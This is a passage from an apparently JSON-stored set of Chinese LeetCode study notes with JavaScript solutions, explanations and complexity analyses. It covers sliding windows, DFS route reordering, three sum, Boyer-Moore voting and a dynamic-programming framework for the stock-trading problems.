开始，每次移动一位，动态维护 count 和 res 的值\n  for (let i = k; i < s.length; i++) {\n    // 先移除滑动窗口的前一个元素，如果是元音字母，则 count 减一\n    if (isVowel(s[i - k])) {\n      count--;\n    }\n    // 新添加的元素是元音字母，则 count 加一\n    if (isVowel(s[i])) {\n      count++;\n    }\n    // 更新 res 的值\n    res = Math.max(res, count);\n    // 如果 res 等于 k，直接返回 k,可以提前结束循环\n    if (res === k) {\n      break;\n    }\n  }\n\n  return res;\n};\n\n```\n\n> - 真正滑动窗口时，\n>    - 需要先判断上一个字母是否元音，是的话，`count --`\n>    - 然后再判断当前的元素，是的话，`count++`\n\n### 复杂度分析\n\n- 时间复杂度是 O(n)，其中 n 是字符串的长度。我们只需要遍历一次字符串。\n- 空间复杂度是 O(1)，因为我们只使用了几个变量来存储状态，不需要额外的数据结构。\n\n优化点：\n\n1. 使用`**Set**`来存储元音字母集合，可以稍微提高查找效率。\n2. 当找到长度为 k 的全是元音的子串时，`**可以提前结束循环**`，因为这已经是最大可能值。\n\n## 错误记录\n\n","BWLQzuvh":"\n# 重新规划路线\n\n\n`#leetcode`   `#2024/09/13`  `#算法`  `#DFS`  `#算法/图` \n\n\n## 目录\n<!-- toc -->\n ## 题目及理解 \n\n> https://leetcode.cn/problems/reorder-routes-to-make-all-paths-lead-to-the-city-zero/description/?envType=study-plan-v2&envId=leetcode-75\n\n![cos-blog-832-34-20241012|600](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240913064057.png)\n\n## 思路\n\n1. **建图**：\n\t- 首先，将给定的**有向边数组**转换为一个**无向图（邻接表）**\n\t- 同时，使用一个集合来**记录原有的有向边**，以便在之后判断是否需要反转边的方向\n2. **深度优先搜索（DFS）**\n    - 从`节点 0` 开始进行 DFS 遍历，对于每个未访问过的相邻节点\n        - 如果通过当前节点到达相邻节点的边是原有的有向边，则需要**增加一次反转计数**。\n        - 继续递归遍历相邻节点\n3. **统计反转次数**：在 DFS 的过程中，统计需要反转的边的数量。\n\n> 题设中是要求，每个城市都能到到达 `城市 0` ，所以从 0 开始深度遍历，遍历过程中，如果不包含原始有向边，则将`计数器 + 1`\n\n\n## 代码实现\n\n```javascript hl:28-31\n/**\n * @param {number} n\n * @param {number[][]} connections\n * @return {number}\n */\nvar minReorder = function (n, connections) {\n  // 构建邻接表\n  const graph = new Array(n).fill(0).map(() => []);\n  // 记录原始边，使用 Set 避免重复，key 为 \"u,v\"，表示 u 到 v 的有向边\n  const originalEdges = new Set();\n\n  // 使用有向边构建邻接表（无向）\n  for (const [u, v] of connections) {\n    graph[u].push(v);\n    graph[v].push(u);\n    originalEdges.add(`${u},${v}`);\n  }\n\n  // 记录反向边的数量(需要重新规划的边的数量)\n  let reorderCount = 0;\n  // 记录节点是否被访问\n  const visited = new Array(n).fill(false);\n\n  function dfs(node) {\n    visited[node] = true;\n    for (const neighbor of graph[node]) {\n      if (!visited[neighbor]) {\n        // 检查是否需要反转\n        // 如果原始边集合中有 neighbor 到 node 的边,则不需要反转，即能够达到中心城市 0\n        // 否则，需要反转\n        // 即如下代码，node 到 neighbor 的边需要反转，node 代表中心城市 0\n        if (originalEdges.has(`${node},${neighbor}`)) {\n          reorderCount++;\n        }\n        dfs(neighbor);\n      }\n    }\n  }\n\n  // 从节点 0 开始 DFS\n  dfs(0);\n  return reorderCount;\n};\n\n```\n\n## 复杂度分析\n\n\n\n时间复杂度：O(N + E)\n- **N 是城市的数量，E 是连接的数量。**\n- 构建邻接表和原始边集合需要 O(E) 的时间。\n- DFS 遍历每个节点和边一次，总共需要 O(N + E) 的时间。\n- 对于每个边，检查是否需要反转的操作（使用 Set 的 has 方法）是 O(1) 的。\n\n空间复杂度：O(N + E)\n- 邻接表 graph 需要 O(N + E) 的空间。\n- 原始边集合 originalEdges 需要 O(E) 的空间。\n- visited 数组需要 O(N) 的空间。\n- 递归调用栈在最坏情况下可能达到 O(N) 的深度。\n\n总结：\n- 时间复杂度：O(N + E)\n- 空间复杂度：O(N + E)\n\n这个算法的效率相当高，因为它只需要遍历每个节点和边一次。使用 Set 来存储原始边可以在 O(1) 时间内检查边的方向，这是一个很好的优化。整体来说，这是一个高效的解决方案，适用于大规模的输入数据。\n","zwQ14p77":"\n# 删掉一个元素以后全为 1 的最长子数组\n\n\n`#leetcode`  `#算法/滑动窗口`  `#2024/07/28` `#算法/双指针`  \n\n\n## 目录\n<!-- toc -->\n ## 题目及理解 \n\n> 题意就是标题：`删掉一个元素以后全为 1 的最长子数组`\n\n![image.png|568](https://832-1310531898.cos.ap-beijing.myqcloud.com/f25f1a142fcf530dcaf2a1695946b6da.png)\n\n>  一般是删除 0 ，但有可能也需要删除  1，比如全部为 1 的场景\n\n## 解题思路\n\n> **使用滑动窗口技术：滑动窗口的方法非常适合解决这类\"最长子数组\"或\"最短子数组\"的问题**\n\n### 问题分析\n\n- 我们需要找到一个`最长的子数组`, 这个子数组最多包含一个`0`。\n- 删除这个`0`(如果存在)后，子数组应该全部由`1`组成。\n- 如果整个数组都是`1,`我们仍然需要删除一个元素。\n\n### 具体思路\n\n- 使用两个指针 (`left` 和 `right`)来定义一个窗口，这个窗口代表我们当前考虑的子数组\n   - 扩大窗口：`right++`\n   - 缩小窗口：`left++`\n- 计数策略\n   - 我们需要找到一个`最长的子数组`**, 这个子数组**`最多包含一个0`\n   - **下面就是维护 0 的个数：**`zeroCount`\n- `zeroCount > 1` 时，需要缩小窗口，即 `left++ `\n\n## 代码实现\n```javascript\n/**\n * @param {number[]} nums\n * @return {number}\n */\nvar longestSubarray = function (nums) {\n  let left = 0; // 左指针\n  let right = 0; // 右指针\n  let zeroCount = 0; // 0 的个数\n  let res = 0; // 最长的连续的 1 的个数\n\n  // 使用快指针，遍历数组\n  for (; right < nums.length; right++) {\n    \n    // 如果当前元素是 0，就增加 0 的个数\n    if (nums[right] === 0) {\n      zeroCount++;\n    }\n\n    // 如果 0 的个数大于 1，就需要移动左指针,来减少0的数量\n    // 说明窗口内 0 的数量超过了允许的最大值，这时需要收缩窗口\n    while (zeroCount > 1) {\n      // 如果左指针对应的元素是 0，就减少 0 的个数\n      if (nums[left] === 0) {\n        zeroCount--;\n      }\n      // 左指针右移\n      left++;\n    }\n\n    // 在每次迭代中更新最大窗口长度\n    res = Math.max(res, right - left + 1);\n  }\n\n  // 题目要求返回的是 1 的个数，所以需要减去 1\n  // 如果整个数组都是1，我们仍然需要删除一个元素\n  return res < nums.length ? res - 1 : nums.length - 1;\n};\n\n```\n\n### 复杂度分析\n\n- 时间复杂度是 O(n)，其中 n 是数组的长度，因为我们只遍历数组一次。\n- 空间复杂度是 O(1)，因为我们只使用了常数级的额外空间。\n\n## 错误记录\n\n- 边界条件处理：`如果整个数组都是1，我们仍然需要删除一个元素` \n\n","3M62VtIR":"\n# 三数之和\n\n\n`#leetcode`   `#2024/07/31`  `#双指针` `#算法/双指针`   `#算法/Nsum` \n\n\n## 目录\n<!-- toc -->\n ## 1. 题目及理解 \n\n![image.png600600|476](https://832-1310531898.cos.ap-beijing.myqcloud.com/202407310756023.png?imageSlim)\n\n## 2. 解题思路\n\n### 2.1. 先看二数之和\n\n思路：先对 `nums` 排序，然后使用`左右双指针技巧`，从两端相向而行即可，如下代码：\n\n```javascript\nvar twoSum = function (nums, target) {  \n    // ① 先排序  \n    nums.sort((a, b) => a - b);  \n    let res = [];  \n      \n    // ② 定义左右指针，分别指向数组的头和尾  \n    let lo = 0, hi = nums.length - 1;  \n      \n    // ③ 循环条件，从两端向中间靠拢  \n    while (lo < hi) {  \n        let sum = nums[lo] + nums[hi];  \n        // 根据 sum 和 target 的比较，移动左右指针  \n        if (sum < target) {  \n            lo++;  \n        } else if (sum > target) {  \n            hi--;  \n        } else {  \n            res.push([nums[lo], nums[hi]]);  \n            lo++;  \n            hi--;  \n        }  \n    }  \n    return res;  \n};\n```\n\n`nums` 中可能有多对儿元素之和都等于 `target`，请你的算法返回所有和为 `target` 的元素对儿，其中不能出现重复，上面代码有点问题，比如：\n\n![image.png600|432](https://832-1310531898.cos.ap-beijing.myqcloud.com/202407310806671.png?imageSlim)\n\n所以我们遍历时需要 `跳过相同的元素`，如下代码：\n\n```javascript\n/**  \n * @param {number[]} nums  \n * @param {number} target  \n * @return {number[][]}  \n */  \nvar twoSumTarget = function (nums, target) {  \n    // nums 数组必须有序  \n    nums.sort((a, b) => a - b);  \n    let lo = 0, hi = nums.length - 1;  \n    let res = [];  \n    while (lo < hi) {  \n        let sum = nums[lo] + nums[hi];  \n        let left = nums[lo];  \n        let right = nums[hi];  \n        // 根据 sum 和 target 的比较，移动左右指针  \n        if (sum < target) {  \n            // ① 左边碰到相同的元素，一直向右移动，直到不相同的元素位置  \n            while (lo < hi && nums[lo] == left) lo++;  \n        } else if (sum > target) {  \n            // ② 右边碰到相同的元素，一直向左移动，直到不相同的元素位置  \n            while (lo < hi && nums[hi] == right) hi--;  \n        } else {  \n            res.push([left, right]);  \n            // ③ 左边碰到相同的元素，一直向右移动，直到不相同的元素位置  \n            while (lo < hi && nums[lo] == left) lo++;  \n            // ④ 右边碰到相同的元素，一直向左移动，直到不相同的元素位置  \n            while (lo < hi && nums[hi] == right) hi--;  \n        }  \n    }  \n    return res;  \n};\n```\n\n### 2.2. 三数之和等 `0`\n\n#### 2.2.1.   泛化：`target` 不为 `0` 呢？\n\n```javascript\n/**  \n * @param {number[]} nums  \n * @return {number[][]}  \n */  \nvar threeSum = function (nums) {  \n    // 求和为 0 的三元组  \n    return threeSumTarget(nums, 0);  \n};\n\n/**  \n * @param {number[]} nums  \n * @param {number} target  \n * @return {number[][]}  \n */  \nvar threeSumTarget = function (nums, target) {\n\t// ....\n}\n```\n\n#### 2.2.2. `threeSumTarget` 思路\n\n-  从 `nums` 中找  `[a,b,c] `  使得  `a + b + c = target` \n\t- 遍历 `nums`\n\t\t-  `a = nums[i]` 时\n\t\t\t- 这个时候需要从 `nums` 中的下标 `i` 开始找两数之和为 `target - a`\n\t\t\t\t- 问题转化成两数之和  `threeSumTarget`\n\n#### 2.2.3. 问题转成两数之和：`threeSumTarget`\n\n```javascript\n/**  \n * @param {number[]} nums  \n * @param {number} target  \n * @param {number} start 从 start 开始找  \n * @return {number[][]}  \n */  \nvar twoSumTarget = function (nums, start, target) {  \n    // nums 数组必须有序  \n    nums.sort((a, b) => a - b);  \n    let lo = start;  \n    let hi = nums.length - 1;  \n    let res = [];  \n    while (lo < hi) {  \n        let sum = nums[lo] + nums[hi];  \n        let left = nums[lo];  \n        let right = nums[hi];  \n        // 根据 sum 和 target 的比较，移动左右指针  \n        if (sum < target) {  \n            // ① 左边碰到相同的元素，一直向右移动，直到不相同的元素位置  \n            while (lo < hi && nums[lo] === left) lo++;  \n        } else if (sum > target) {  \n            // ② 右边碰到相同的元素，一直向左移动，直到不相同的元素位置  \n            while (lo < hi && nums[hi] === right) hi--;  \n        } else {  \n            res.push([left, right]);  \n            // ③ 左边碰到相同的元素，一直向右移动，直到不相同的元素位置  \n            while (lo < hi && nums[lo] === left) lo++;  \n            // ④ 右边碰到相同的元素，一直向左移动，直到不相同的元素位置  \n            while (lo < hi && nums[hi] === right) hi--;  \n        }  \n    } \n    return res;  \n};\n```\n\n## 3. 代码实现\n\n最终代码如下：\n\n```javascript\n/**  \n * @param {number[]} nums  \n * @return {number[][]}  \n */  \nvar threeSum = function (nums) {  \n    // 求和为 0 的三元组  \n    return threeSumTarget(nums, 0);  \n};  \n  \n  \n/**  \n * @param {number[]} nums  \n * @param {number} target  \n * @return {number[][]}  \n */  \nvar threeSumTarget = function (nums, target) {  \n    // :::: ① 数组先排个序  \n    nums.sort(function (a, b) {  \n        return a - b  \n    });  \n    var n = nums.length;  \n    var res = [];  \n  \n    // ::::③ 遍历数组，a + b + c = target \n    //        其中 a = nums[i] ，b + c =  target - nums[i]  \n    for (var i = 0; i < n; i++) {  \n        const a = nums[i];  \n        const twoTarget = target - a;  \n        // ::::③ 递归计算 b + c = target - nums[i] 的二元组  \n        var twoSumArr = twoSumTarget(nums, i + 1, twoTarget);  \n  \n        // ::::④ 遍历二元组，将 nums[i] 加上就是结果三元组  \n        // 如果存在满足条件的二元组，再加上 nums[i] 就是结果三元组  \n        for (var j = 0; j < twoSumArr.length; j++) {  \n            var tuple = twoSumArr[j];  \n            tuple.push(nums[i]);  \n            res.push(tuple);  \n        }  \n        // ::::⑤ 跳过后面，出现的数字重复的情况，否则会出现重复结果  \n        // 跳过第一个数字重复的情况，否则会出现重复结果  \n        while (i < n - 1 && nums[i] === nums[i + 1]) i++;  \n    }  \n  \n    return res;  \n}  \n  \n/**  \n * @param {number[]} nums  \n * @param {number} target  \n * @param {number} start 从 start 开始找  \n * @return {number[][]}  \n */  \nvar twoSumTarget = function (nums, start, target) {  \n    // nums 数组必须有序  \n    nums.sort((a, b) => a - b);  \n    let lo = start;  \n    let hi = nums.length - 1;  \n    let res = [];  \n    while (lo < hi) {  \n        let sum = nums[lo] + nums[hi];  \n        let left = nums[lo];  \n        let right = nums[hi];  \n        // 根据 sum 和 target 的比较，移动左右指针  \n        if (sum < target) {  \n            // ① 左边碰到相同的元素，一直向右移动，直到不相同的元素位置  \n            while (lo < hi && nums[lo] === left) lo++;  \n        } else if (sum > target) {  \n            // ② 右边碰到相同的元素，一直向左移动，直到不相同的元素位置  \n            while (lo < hi && nums[hi] === right) hi--;  \n        } else {  \n            res.push([left, right]);  \n            // ③ 左边碰到相同的元素，一直向右移动，直到不相同的元素位置  \n            while (lo < hi && nums[lo] === left) lo++;  \n            // ④ 右边碰到相同的元素，一直向左移动，直到不相同的元素位置  \n            while (lo < hi && nums[hi] === right) hi--;  \n        }  \n    }  \n    return res;  \n};\n```\n\n### 3.1. 复杂度分析\n\n- 时间复杂度上，为 `O(n^2)`\n\t- 主函数 threeSum:\n        -  调用 threeSumTarget，复杂度与 threeSumTarget 相同。\n    - threeSumTarget 函数:\n        - 排序:  `O(n log n)`\n        - 外层循环： `O(n)`\n            - 每次循环中调用 `twoSumTarget: O(n)`\n        - 总体复杂度： `O(n^2)`\n    - twoSumTarget 函数:\n        - 双指针遍历: `O(n)`\n    - 综合起来，整个算法的时间复杂度是 `O(n^2)`。\n- 空间复杂度在最坏情况下可能达到 `O(n^2)`，主要是由于存储结果所需的空间\n\t- 排序可能需要 O(log n) 的空间（取决于排序算法）。\n\t- 结果数组 res 的大小取决于==满足条件的三元组数量==，最坏情况下可能是 O(n^2)。\n\t- twoSumTarget 函数中的临时结果数组也可能在最坏情况下达到 O(n)。\n\n","nOFBXzIr":"\n# 反转字符串中的单词\n\n`#2024/07/28` `#leetcode` `#算法/反转` \n\n\n## 目录\n<!-- toc -->\n ## 题目及理解 \n\n![image.png](https://832-1310531898.cos.ap-beijing.myqcloud.com/08a29ef8ddbb835cf3d278a38cfa500a.png)\n\n## 解题思路\n\n![image.png](https://832-1310531898.cos.ap-beijing.myqcloud.com/8b5f7205a78d8eedaed7e17010c7aff6.png)\n\n## 代码实现\n\n```javascript\n/**\n * @param {string} s\n * @return {string}\n */\nvar reverseWords = function (s) {\n  // 1、去除首尾空格，并将多个空格替换为单个空格\n  s = s.trim().replace(/\\s+/g, \" \");\n  // 2、将字符串反转\n  s = s.split(\"\").reverse().join(\"\");\n  // 3、将字符串按空格分割为数组\n  const words = s.split(\" \");\n  // 4、遍历数组，将每个单词反转\n  for (let i = 0; i < words.length; i++) {\n    words[i] = words[i].split(\"\").reverse().join(\"\");\n  }\n  // 5、将反转后的单词数组重新组合成字符串\n  return words.join(\" \");\n};\n```\n\n> - 如果不能使用 `Array.reverse`，则可以使用`双指针`自己写一个`辅助函数`\n\n","bMtwKm7z":"\n# 确定两个字符串是否接近\n\n\n`#leetcode` \n\n\n## 目录\n<!-- toc -->\n ## 题目及理解 \n\n![image.png600|550](https://832-1310531898.cos.ap-beijing.myqcloud.com/202407260859792.png?imageSlim)\n\n## 解题思路\n\n需要满足以下三个条件：\n\n- 包含的字符集需要相同\n- **每种字符出现的频率排序后相同**\n\t- 如何理解呢？\n\t\t- `word1 = \"cabbba\" `  对应的频率  `[ 2, 3, 1 , 0, 0, ..., 0]`\n\t\t- `word2 = \"abbccc\"`    对应的频率  `[1, 2, 3, 0, 0, ..., 0]`\n\n## 代码实现\n\n```javascript\n/**  \n * @param {string} word1  \n * @param {string} word2  \n * @return {boolean}  \n */  \nvar closeStrings = function (word1, word2) {  \n    // 两个字符串的长度不相等，直接返回 false  \n if (word1.length !== word2.length) {  \n    return false;  \n  }  \n  \n  // 用于记录两个字符串中字符出现的次数  \n  const arr1 = new Array(26).fill(0);  \n  const arr2 = new Array(26).fill(0);  \n  \n  // 遍历两个字符串，记录字符出现的次数  \n  for (let i = 0; i < word1.length; i++) {  \n    arr1[word1.charCodeAt(i) - 97]++;  \n  }  \n  for (let i = 0; i < word2.length; i++) {  \n    arr2[word2.charCodeAt(i) - 97]++;  \n  }  \n  \n  // 包含相同字符  \n  // 转成数组，排序，转成字符串，去重  \n  const str1 = arr1.sort().join(\"\");  \n  const str2 = arr2.sort().join(\"\");  \n  \n  return str1 === str2;  \n};\n```\n\n> [!info]\n> `word1.charCodeAt(i) - 97` 这个平时不怎么常用，需要能够写出来！\n\n## 错误日志\n\n> [!danger]\n> 题意理解有误，一定是需要保证`互相更换相同的次数`后能够`互相得到`\n\n```javascript\n/**\n * @param {string} word1\n * @param {string} word2\n * @return {boolean}\n */\nvar closeStrings = function (word1, word2) {\n  // 两个字符串的长度不相等，直接返回 false\n  if (word1.length !== word2.length) {\n    return false;\n  }\n  // 包含相同字符\n  // 转成数组，排序，转成字符串，去重\n  const str1 = word1.split(\"\").sort().join(\"\");\n  const str2 = word2.split(\"\").sort().join(\"\");\n  return str1 === str2;\n};\n\n```","nmYTPpS4":"\n# K 和数对的最大数目\n\n\n`#leetcode`  `#算法/哈希`  `#2024/07/28` \n\n\n## 目录\n<!-- toc -->\n ## 1. 题目及理解 \n\n![image.png|552](https://832-1310531898.cos.ap-beijing.myqcloud.com/ce8d96510f9e7129cb173c644ceb5657.png)\n\n## 2. 解题思路\n\n- 思路一：使用 hash 正常遍历思路即可\n   - 边界情况处理：如果存在两个相同的值的场景\n- 思路二：先排序，然后使用双指针，这里没写代码了\n\n## 3. 代码实现\n\n```javascript\n/**\n * @param {number[]} nums\n * @param {number} k\n * @return {number}\n */\nvar maxOperations = function (nums, k) {\n  // 用于记录重复元素的个数\n  let map = new Map();\n  // 初始化 map\n  for (const num of nums) {\n    map.set(num, (map.get(num) || 0) + 1);\n  }\n\n  // 代表最大操作次数\n  let count = 0;\n\n  for (const num of nums) {\n    // 需要的另一个数，即 num + need = k\n    const need = k - num;\n    // 确保 num 和 need 存在的个数都大于 0，才能进行操作\n    if (map.get(need) > 0 && map.get(num) > 0) {\n      // 如果 num === need，且 map 中的值小于 2，则不满足条件\n      if (num === need && map.get(num) < 2) continue;\n\n      // 更新 map 中的值\n      map.set(num, map.get(num) - 1);\n      map.set(need, map.get(need) - 1);\n      // 更新 count\n      count++;\n    }\n  }\n\n  return count;\n};\n\n```\n\n> 1. 两个 for 循环为了更好的理解\n\n### 3.1. 复杂度分析\n\n## 4. 代码实现二\n\n- 先排序，然后使用双指针，这里没写代码了\n\n## 5. 错误记录\n\n1. 不能使用 `map.has` ，代表是否有某个属性值\n\n","JvB6s4Qe":"\n# 多数元素\n\n\n`#leetcode`   `#2024/08/05`\n\n\n## 目录\n<!-- toc -->\n ## 1. 题目及理解 \n\n![image.png600|504](https://832-1310531898.cos.ap-beijing.myqcloud.com/202408050622674.png?imageSlim)\n\n## 2. 解题思路\n\n### 2.1. 解法 1：哈希\n\n使用一个`哈希表`来统计每个元素的出现次数，并找到出现次数超过 `⌊ n/2 ⌋` 的元素\n\n### 2.2. 解法 2：排序\n\n多数元素的出现频率超过 `⌊ n/2 ⌋` ，因此排序后的数组**中间位置**的元素即为多数元素。\n\n所以排序后，返回 `nums[midIndex]` 即可\n\n### 2.3. 解法 3：Boyer-Moore 投票算法\n\n- 核心思想是\"对抗\"或\"抵消\"\n\t- 每个候选人都有支持者。\n\t- 支持者之间可以互相抵消。\n\t- 如果一个候选人的支持者数量超过了总人数的一半，那么即使所有其他候选人的支持者联合起来，也无法完全抵消这个候选人的支持者\n\n1. **初始化**：\n    - 设置 `candidate` 为 `null`（还没有候选人）\n    - 设置 `count` 为 0（计票器）\n2. **遍历数组**： 对于数组中的每个元素：\n    - 如果 `count` 为 0：\n        - 将当前元素设为新的 `candidate`\n        - 将 `count` 设为 1\n    - 否则：\n        - 如果当前元素等于 `candidate`，`count` 加 1\n        - 如果当前元素不等于 `candidate`，`count` 减 1\n3. **返回结果**： 遍历结束后，`candidate` 就是多数元素\n\n## 3. 代码实现\n\n```javascript\n/**\n * @param {number[]} nums\n * @return {number}\n */\nvar majorityElement = function (nums) {\n    // 当前遍历的候选人, 初始化为 null,\n    // 刚开始，还没遍历任何元素，所以候选人是 null\n    let target = null;\n    // 该候选人 target 的票数\n    let count = 0;\n\n    for (const num of nums) {\n        // 如果 count 为 0 ，说明之前的票数抵消完了，需要重新设置候选人\n        if (count === 0) {\n            target = num;\n            count = 1;\n        } else {\n            // 如果当前的数字和候选人相同，票数 + 1\n            if (num === target) {\n                count++;\n            } else {\n                // 如果当前的数字和候选人不同，票数 - 1\n                count--;\n            }\n        }\n    }\n    return target;\n};\n\n```\n\n### 3.1. 复杂度分析\n\n- 时间复杂度：`O(n)`，只需要遍历数组一次。\n- 空间复杂度：`O(1)`，只使用了常数额外空间。\n\n## 4. 算法应用\n\n- 在数据流中找到`频繁项`\n- 一群带正电的粒子和一群带负电的粒子，判断他们的`正负性`或者`中性`\n\n## 5. 错误记录","7yWWDxo5":"\n# 找到最高海拔\n\n\n`#算法` `#2024/07/28` `#leetcode` \n\n\n## 目录\n<!-- toc -->\n ## 题目及理解 \n\n![image.png|672](https://832-1310531898.cos.ap-beijing.myqcloud.com/0b67ca13731e85886bdfa6b3502dd319.png)\n\n## 解题思路\n\n1. 初始化一个变量 `max` 来记录最高海拔，初始值为 0。\n2. 初始化一个变量 `current` 来记录当前海拔，初始值为 0。\n3. 遍历 `gain` 数组：\n   - 将当前的高度变化加到 `current` 上。\n   - 比较 `current` 和 `max`，更新 `max` 如果需要。\n4. 返回 `max`。\n\n## 代码实现\n\n```javascript\n/**\n * @param {number[]} gain\n * @return {number}\n */\nvar largestAltitude = function (gain) {\n  let max = 0; // 最大高度\n  let current = 0; // 当前高度，因为自行车手从海拔为 0 的地方开始骑行，所以当前高度为 0\n  for (let i = 0; i < gain.length; i++) {\n    //  gain[i] 是点 i 和点 i + 1 的 净海拔高度差（\n    //  当前高度 = 当前高度 + gain[i]\n    current += gain[i];\n    max = Math.max(max, current);\n  }\n\n  return max;\n};\n\n```\n\n### 复杂度分析\n\n- 时间复杂度是 O(n)，其中 n 是 `gain` 数组的长度，因为我们只需要遍历一次数组。\n- 空间复杂度是 O(1)，因为我们只使用了常数级的额外空间\n\n## 错误记录\n\n- let 和 const 用混了\n\n","ZKFcbnz2":"\n# 交替合并字符串\n\n\n`#算法/双指针`  `#2024/07/28` `#leetcode` \n\n\n## 目录\n<!-- toc -->\n ## 题目 \n\n![image.png|576](https://832-1310531898.cos.ap-beijing.myqcloud.com/d4ea1f26f2d3ac5e04cf57f5500ed2e4.png)\n\n### 题目重点\n\n- 交替合并\n- 最后的直接到末尾即可\n\n## 思路\n\n- 也是`双指针技巧`\n- 从 `0` 开始\n\n## 代码实现\n\n```javascript\n/**\n * @param {string} word1\n * @param {string} word2\n * @return {string}\n */\nvar mergeAlternately = function (word1, word2) {\n  let res = \"\"; // 保存结果\n  const m = word1.length;\n  const n = word2.length;\n  const max = Math.max(m, n); // 取最大长度\n\n  for (let k = 0; k < max; k++) {\n    // 如果k小于m, 则将word1的第k个字符加入到res中\n    if (k < m) {\n      res += word1[k];\n    }\n    // 如果k小于n, 则将word2的第k个字符加入到res中\n    if (k < n) {\n      res += word2[k];\n    }\n  }\n\n  return res;\n};\n\n```\n\n> **注意：就没有最后字符串拼接环节，正常遍历就好**\n\n## 参考\n\n- [https://leetcode.cn/problems/merge-strings-alternately/submissions/548008565/?envType=study-plan-v2&envId=leetcode-75](https://leetcode.cn/problems/merge-strings-alternately/submissions/548008565/?envType=study-plan-v2&envId=leetcode-75)\n\n","0Yl4ImEk":"\n# 买卖股票的最佳时机 IV\n\n\n`#leetcode`   `#2024/08/10` `#算法/动态规划` \n\n\n## 目录\n<!-- toc -->\n ## 题目及理解 \n\n![cos-blog-832-34-20241012|592](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240810100713.png)\n\n这题是股票买卖最通用的一题，可以以他基准解决其他股票相关的问题，如下图\n\n![cos-blog-832-34-20241012](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240810101116.png)\n\n- 第一题是只进行一次交易，相当于 `k = 1`；\n- 第二题是不限交易次数，相当于 `k = +infinity`（正无穷）；\n- 第三题是只进行 2 次交易，相当于 `k = 2`；\n- 剩下两道也是不限次数，但是加了交易「冷冻期」和「手续费」的额外条件，其实就是第二题的变种，都很容易处理\n\n## 解题思路\n\n### 思路一：动态规划\n\n#### 框架：明确状态和选择\n\n```javascript\nfor 状态1 in 状态1的所有取值：\n    for 状态2 in 状态2的所有取值：\n        for ...\n            dp[状态1][状态2][...] = 择优(选择1，选择2...)\n```\n\n- 选择：每天都有三种选择：买入、卖出、无操作\n\t- 用 `buy`, `sell`, `rest` 表示这三种选择。\n- 状态：**这个问题的「状态」有三个**，所以可以使用`三维数组`来组装下所有组合\n\t- ① 第一个是`天数`\n\t- ② 第二个是`允许交易的最大次数`\n\t- ③ 第三个是`当前的持有状态`\n\t\t- 即之前说的 `rest` 的状态\n\t\t\t- 用 `1` 表示`持有`\n\t\t\t- `0` 表示`没有持有`\n\n再看最新的框架\n\n```javascript\ndp[i][k][0 or 1]\n\n① i:  0 <= i <= n - 1 ， n 表示 `天数`\n② k:  1 <= k <= K ，K 表示`允许交易的最大次数`\n③ 0 or  1 ： 代表`当前的持有状态` ， 0 和 1 代表是否持有股票。\n\n所以 此问题共 n × K × 2 种状态，全部穷举就能搞定。\n\nfor 0 <= i < n:\n    for 1 <= k <= K:\n        for s in {0, 1}:\n            dp[i][k][s] = max(buy, sell, rest)\n```\n\n举例：\n\n  - `dp[3][2][1]` 的含义就是：今天是第三天，我现在手上持有着股票，至今最多还可以进行 2 次交易。\n  -  `dp[2][3][0]` 的含义：今天是第二天，我现在手上没有持有股票，至今最多还可以进行 3 次交易\n\n我们想求的**最终答案**是 `dp[n - 1][K][0]`，即最后一天，最多允许 `K` 次交易，最多获得多少利润。\n\n读者可能问为什么不是 `dp[n - 1][K][1]`？\n\n- 因为 `dp[n - 1][K][1]` 代表到最后一天手上还持有股票\n- `dp[n - 1][K][0]` 表示最后一天手上的股票已经卖出去了\n- 很显然后者得到的利润一定大于前者\n\n#### 状态转移框架\n\n![cos-blog-832-34-20241012|544](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240810103019.png)\n\n##### 今天没有持有股票： `dp[i][k][0]`\n\n1. 昨天没有持有，今天选择不买，`k` 不会变\n2. 昨天持有，今天选择卖掉，`k` 不会变\n\n```javascript\n// 今天我没有持有股票，有两种可能，我从这两种可能中求最大利润,如下代码：\ndp[i][k][0] = max( ① dp[i-1][k][0],           ② dp[i-1][k][1] + prices[i]  ) \n            = max( ① 昨天没有持有，今天选择不买   ② 昨天持有，今天选择卖掉 sell    )\n```\n\n①  `dp[i-1][k][0]` ，即我昨天就没有持有，且截至昨天最大交易次数限制为 `k`；然后我今天选择 `rest`，所以我今天还是没有持有，最大交易次数限制依然为 `k`\n\n②  `dp[i-1][k][1] + prices[i]` ，我昨天持有股票，且截至昨天最大交易次数限制为 `k`；但是今天我 `sell` 了，所以我今天没有持有股票了，最大交易次数限制依然为 `k`\n\n##### 今天持有股票： `dp[i][k][1]`\n\n- 昨天持有，今天还是继续持有，`k` 不变\n- 昨天没有持有，今天选择买，`k` 从 `k-1` 而来\n\n```javascript\ndp[i][k][1] = max( ① dp[i-1][k][1],             ② dp[i-1][k-1][0] - prices[i] )\n              max( ① 昨天持有，今天还是继续持有,    ② 昨天没有持有，今天选择买        )\n```\n\n① `dp[i-1][k][1]` ，我昨天就持有着股票，且截至昨天最大交易次数限制为 `k`；然后今天选择 `rest`，所以我今天还持有着股票，最大交易次数限制依然为 `k`。\n\n② `dp[i-1][k-1][0] - prices[i]` 我昨天本没有持有，且截至昨天最大交易次数限制为 `k - 1`；但今天我选择 `buy`，所以今天我就持有股票了，最大交易次数限制为 `k`。\n\n##### 注意点\n\n- 如果 `buy`，就要从利润中减去 `prices[i]`\n- 如果 `sell`，就要给利润增加 `prices[i]`。\n- 今天的最大利润就是这两种可能选择中较大的那个。\n- 注意 `k` 的限制，在选择 `buy` 的时候相当于开启了一次交易，那么对于昨天来说，交易次数的上限 `k` 应该减小 1。\n\n##### base case\n\n```javascript\ndp[-1][0 ~ k][0] = 0\n解释：因为 i 是从 0 开始的，所以 i = -1 意味着还没有开始，这时候的利润当然是 0。\n\ndp[-1][0 ~ k][1] = -infinity\n解释：还没开始的时候，是不可能持有股票的。\n因为我们的算法要求一个最大值，所以初始值设为一个最小值，方便取最大值。\n\ndp[...][0][0] = 0\n解释：因为 k 是从 1 开始的，所以 k = 0 意味着根本不允许交易，这时候利润当然是 0。\n\ndp[...][0][1] = -infinity\n解释：不允许交易的情况下，是不可能持有股票的。\n因为我们的算法要求一个最大值，所以初始值设为一个最小值，方便取最大值。\n```\n\n##### 